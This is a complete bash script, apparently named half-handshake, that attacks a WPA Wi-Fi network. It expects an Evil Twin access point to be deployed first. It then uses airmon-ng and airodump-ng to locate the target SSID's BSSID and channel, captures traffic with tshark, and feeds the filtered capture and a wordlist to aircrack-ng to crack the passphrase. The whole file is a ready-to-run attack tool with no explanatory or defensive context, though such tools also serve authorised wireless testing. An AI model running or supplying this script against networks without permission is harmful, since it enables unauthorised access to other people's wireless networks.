#!/bin/bash

if [ $# -ne 3 ]; then
        echo "usage: ./half-handshake <wireless interface> <target SSID> <wordlist>"
        exit 1
fi

IFACE=$1
SSID=$2
WORDLIST=$3

clear
read -p "Evil Twin deployed? [Enter]"
sudo airmon-ng check kill &> /dev/null
sudo airmon-ng start $IFACE &> /dev/null

read -p "Enter Q twice to quit airodump-ng once $SSID appears [Enter]"
sudo airodump-ng $IFACE -w dump -I 1 --output-format csv

BSSID=$(grep -m 1 "$SSID" dump-01.csv | awk -F',' '{print $1}')
CHANNEL=$(grep -m 1 "$SSID" dump-01.csv | awk -F',' '{print $4}')
rm -f dump-01.csv

clear
echo $SSID is on channel $CHANNEL with BSSID $BSSID
read -p "Ready to capture half-handshake. Enter capture length in seconds to begin: " CAPTIME

# capture handshake
sudo airodump-ng $IFACE -c $CHANNEL -K 1 &> /dev/null & 
tshark -i wlan0 -w raw.pcapng -a duration:$CAPTIME &> /dev/null &

printf "Capturing... %3u" $CAPTIME
while [ $CAPTIME -gt 0 ]; do
        sleep 1
        CAPTIME=$((CAPTIME-1))
        printf "\b\b\b%3u" $CAPTIME
done

# filter pcap
tshark -r raw.pcapng -F pcap -w half-handshake.pcap "wlan.addr == $BSSID"
rm -f raw.pcapng

# clean up
sudo killall airodump-ng
sudo airmon-ng stop $IFACE &> /dev/null
stty sane

if ! sudo aircrack-ng half-handshake.pcap -w $WORDLIST; then
        echo "The capture did not contain any half-handshake"
        exit 1
fi
